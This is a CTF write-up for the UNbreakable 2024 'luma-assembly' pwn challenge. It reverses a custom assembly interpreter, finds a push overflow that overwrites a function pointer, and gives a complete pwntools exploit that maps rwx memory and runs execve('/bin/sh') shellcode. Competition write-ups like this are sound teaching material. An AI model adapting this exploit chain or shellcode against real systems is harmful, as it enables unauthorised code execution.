---
layout: post
title:  "luma-assembly writeup"
date:   2024-04-21 14:50:00 +0000
categories: writeups
description: "Reversing and exploiting a custom assembly instruction set at UNBreakable 2024 Finals"
---

## Introduction
Luma-assembly is a pwn challenge proposed at [UNbreakable 2024 Finals CTF](https://unbreakable.ro) created by my [CTF team](https://ctftime.org/team/140885/) colleague and friend: `Luma`. It was labeled as hard and although the idea in itself wasn't necessarily difficult, reversing this challenge was quite tricky.

We're given a 64-bit ELF that supposedly implements a custom assembly language. Let's have a look!

## Reversing


First of, if we run the binary, it prints out some registers:

```
Registers initialised: 
(l0) = 0x0000000000000000
(l1) = 0x0000000000000000
(l2) = 0x0000000000000000
(l3) = 0x0000000000000000
(l4) = 0x0000000000000000
(l5) = 0x0000000000000000
(lax) = 0x0000000000000000
(lip) = 0x0000000000000000
-------------------------------------
Insert luma code: 
```

Main flow of the program is that it reads a line from stdin that actually represents the custom assembly instructions. We have 2 types of instructions:
- `op reg1, reg2` - instruction that takes 2 registers, performs an operation on them and stores the result in `reg1`
- `op reg` - instruction that takes 1 register, performs an operation on it and stores the result in `reg`
- `mari` - instruction that we'll find out later is actually a syscall

Let's take a closer look!

On `line 72`(in ida) we can see 3 function calls:
```C++
dub = -1;
sg = -1;
mari = -1;
reg1 = -1;
reg2 = -1;
find_op_dub(dest, &dub);
find_op_sg(dest, &sg);
check_mari(dest, &mari);
```

I renamed them accordingly to what they do. The input line is parsed and split by a space, thus extracting the `op`. Each function iterates through a list of strings and performs `strcmp` to see if the `op` matches. If it does, it stores the corresponding instruction index in the variable that is passed as second argument. For example if the structure of our input is `op reg1, reg2`, `find_op_dub` will store the index of the instruction in `dub`.

These functions are useful for us because we can extract the actua instruction names. If we take a look in one of the function, we can see where the instructions are stored:
```C++
if ( !strcmp(a1, some_ops[i]) )
    {
      result = a2;
      *a2 = i;
      return result;
    }
```

![lumasm1](/img/lumasm-writeup/lumasm1.png)

So until now we know the available instructions. The ones in `some_ops` are double register ones and the ones in `some_ops1` are single register.

### What do the instructions actually do?

The next step is to find out what each instruction does. We can see that after the parsing and storing the instruction index, the program adds the index to a base pointer. It's kind of like a jump table:

![lumasm2](/img/lumasm-writeup/lumasm2.png)

You'll see that this space is actually really close to some simulated stack. More on that later.

![lumasm3](/img/lumasm-writeup/lumasm3.png)

All of those zeros is actually stack space. The function pointers are right after.

### Setup for reversing the instructions
---

It's 2024, I can't use `gdb` for reversing something complex like this. Here is were `IDA remote debugger` comes into play. IDA comes with a `linux_server64` file in the `dbgsrv` folder. It acts as a remote debugging server that can serve on my x64 machine. I can connect to it from my local machine and debug the binary remotely with `IDA`. Debugging with `IDA` is a huge life saver because I can look at actual decompiled code and see what's going on, not at assembly.

### Reversing the instructions
---

#### Important note: 
_Some of the functions' bounds from the jump table are really messed up because `IDA` didn't do the best job. You can actually rebound functions in `IDA` and set the start and end address. I won't tell you how to do that. Google is free!_

I will only show the process of reversing one instruction, because others are similar.

Let's have a look at `PA`. This is a double register instruction.

I set a breakpoint right here:
![lumasm4](/img/lumasm-writeup/lumasm4.png)

Run the program and send `PA l0, l1`. Once it stops at the breakpoint, step in the function call.

![lumasm5](/img/lumasm-writeup/lumasm5.png)

It leads us here. First problem is that all registers are 0 so the result of this function wouldn't actually give us any info. Therefore I just set `a1` and `a2` to something random like `4` and `7`. 

Second problem is that it just looks weird as hell but I didn't bother. If we just skip all instructions and get back into main we can then hover our mouse over `registers`(from the screenshot above) and see that the first entry of the array is now `11`. So we can deduce this is an add instruction.

### Reversing the others?!
---

Now just rinse and repeat for the rest 18 instructions. Some were more confusing that others so I had to look into the code a little bit. I won't go into detail because this would be a very long writeup otherwise(and I'm lazy).

**Not so fun fact:** Reversing took me about 3 hours or so. You should arm yourself with patience. 

Here is what instructions actually mean:

```
LAR    -XOR LOW 4 bytes
SG     -reg1*reg2*reg2
DRA    -Right shift
ZS     -Bitwise and
SA     -Bitwise or
PA     -ADD
MN     -SUB
SLE    -DIV
MINE   -MOD
STEL   -MUL
MT     -MOV

NA      -Flip bits
MQ      -Flip bits add 1
UAR     -INC
RY      -DEC
NIM     -RET
BRAILA  -EXIT
BG      -PUSH
SCT     -POP
```

### But wait! There's more...
---

Don't forget about `MARI`: our syscall. If `mari` variable is not -1, it calls a function to handle the syscalls:

![lumasm7](/img/lumasm-writeup/lumasm7.png)

Taking a closer look, we notice this is normal syscall calling convetion: `rax`(in this case `lax`) holds the fake syscall number that is then converted into an actual syscall number and performs a syscall with the `luma registers`:

![lumasm8](/img/lumasm-writeup/lumasm8.png)

Again, with some dynamic and static analysis I managed to extract what syscalls we could actually perform. Relevant ones were: `mmap` and `read`.

```C++
if ( lax == 312 )
{
  v7 = sle_div(312LL, 3LL);
  v8 = dra_rsh(v7, 4LL);
  sysnoe = pa_add(v8, 3LL);
  lax = syscall(sysnoe, *a1, a1[1], a1[2], a1[3], a1[4], a1[5]);// mmap
}
```

```C++
if ( lax == 8 )
{
  sysno = lar_xor_low(8LL, 8LL);
  if ( (__int64)a1[1] > 0x440000 || (__int64)a1[2] > 32 )
  {
    printf("LUMA_ERROR (5): Error when trying to execute syscall!");
    exit(0);
  }
  lax = syscall(sysno, *a1, a1[1], a1[2]);// read
}
```

## Pwning

### But what is the vulnerability?

I mentioned earlier some sort of `stack` system. Instructions `BG` and `SCT` are responsible for `push` and `pop` instructions.

![lumasm9](/img/lumasm-writeup/lumasm9.png)

Rember our stack space right before the function `jump table`? Here is the `vulnerability`.

**If we push 6 times, the 6th push will overwrite `lar` function pointer with whatever value has the register we push.**

## Exploitation plan

Here is the plan I came up with:
- `mmap` some space at `0x400000` that is `rwx` so it can execute shellcode here
- `read` shellcode into the mapped space
- `push` 5 times and `push` `0x400000` over `lar` function pointer.

There are some restrictions:
- each instruction can be used a total of 6 times
- we can't do stuff like `mov rax, 8` so I resulted to some `math` to actually set the registers

## Breaking down my exploit

### Caling mmap

```
INC l1
INC l1
// l1=2

MOV l0, l1
IDK l1, l1
// l0=2, l1=8

MOV l3, l1
MUL l3, l3
// l3=64
DIV l3, l0
// l3=32
ADD l3, l0
// l3=34 (mmap argument for memory type)

MOV l2, l1
// l2=8
DEC l2
// l2=7 (mmap rwx prot)

MUL l0, l0
MUL l0, l0
MUL l0, l0
// l0=256

MOV lax, l2
MUL lax, l1
// lax=56
ADD lax, l0
// lax=256+56=312 (syscall number for mmap)

IDK l1, l1
// l1=0x800
MOV l0, l1
MUL l0, l0
// l0=0x400000
MARI
// syscall
```

`mmap` is now called thus mapping `0x800` bytes at `0x400000` with `rwx` protections.

```
SUB l1, l1
ADD l1, l0
// l1=0x400000 (buf)
SUB l0, l0
// l0=0 (stdin)

SUB l2, l2
ADD l2, l3
// l2=34
DEC l2
DEC l2
// l2=32 (count)

ADD l0, l3
// l0=34
SUB l0, l2
// l0=2
IDK l0, l0
// l0=8 (syscall number)
MOV lax, l0
SUB l0, l0
// lax=8 l0=0
MARI
```
`read` is now called to read 32 bytes at `0x400000` from `stdin`

Now just set each register to a value that is not null and then `push` 6 times having the 6th `push` be `push l1`(l1 is `0x400000`). After all this, `lar` function pointer will be the address to the shellcode.


```
INC l0
INC l0
NA l4
NA l5
PUSH l0
PUSH l2
PUSH l3
PUSH l4
PUSH l5
PUSH l1
LAR l0, l0 // call shellcode and spawn shell
```

### Profit

This challenge was really cool and interesting but the reversing part was pretty tedious. In the end, we `MiniMcStein` were the only team to solve it. It took me a total of more that 5 hours to solve this(I think). It was kinda fun to think of way to set the registers.

### Exploit

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./luma-assembly_patched")

context.binary = exe
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("bruh", 30880)

    return r

def convert_to_luma_asm(data):
    data = data.replace("XOR", "LAR")
    data = data.replace("IDK", "SG")
    data = data.replace("RSH", "DRA")
    data = data.replace("AND", "ZS")
    data = data.replace("OR", "SA")
    data = data.replace("ADD", "PA")
    data = data.replace("SUB", "MN")
    data = data.replace("DIV", "SLE")
    data = data.replace("MOD", "MINE")
    data = data.replace("MUL", "STEL")
    data = data.replace("MOV", "MT")
    data = data.replace("FLIP", "NA")
    data = data.replace("FLIP2", "MQ")
    data = data.replace("INC", "UAR")
    data = data.replace("DEC", "RY")
    data = data.replace("RET", "NIM")
    data = data.replace("EXIT", "BRAILA")
    data = data.replace("PUSH", "BG")
    data = data.replace("POP", "SCT")
    return data.replace("\n\n", "\n")

def main():
    r = conn()

    asm = '''INC l1
INC l1
MOV l0, l1
IDK l1, l1

MOV l3, l1
MUL l3, l3
DIV l3, l0
ADD l3, l0

MOV l2, l1
DEC l2

MUL l0, l0
MUL l0, l0
MUL l0, l0

MOV lax, l2
MUL lax, l1
ADD lax, l0

IDK l1, l1
MOV l0, l1
MUL l0, l0
MARI

SUB l1, l1
ADD l1, l0
SUB l0, l0

SUB l2, l2
ADD l2, l3
DEC l2
DEC l2

ADD l0, l3
SUB l0, l2
IDK l0, l0
MOV lax, l0
SUB l0, l0
MARI
'''

    payload2 ='''INC l0
INC l0
NA l4
NA l5
PUSH l0
PUSH l2
PUSH l3
PUSH l4
PUSH l5
PUSH l1
LAR l0, l0
'''
    stage1 = convert_to_luma_asm(asm)
    print(stage1)
    print()
    print()
    print()
    stage2 = convert_to_luma_asm(payload2)
    print(stage2)

    shellcode = b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52\x5e\x6a\x3b\x58\x0f\x05"

    r.sendafter(b": \n", stage1)
    input("wait")
    r.send(shellcode)
    r.send(stage2)

    r.interactive()


if __name__ == "__main__":
    main()
```

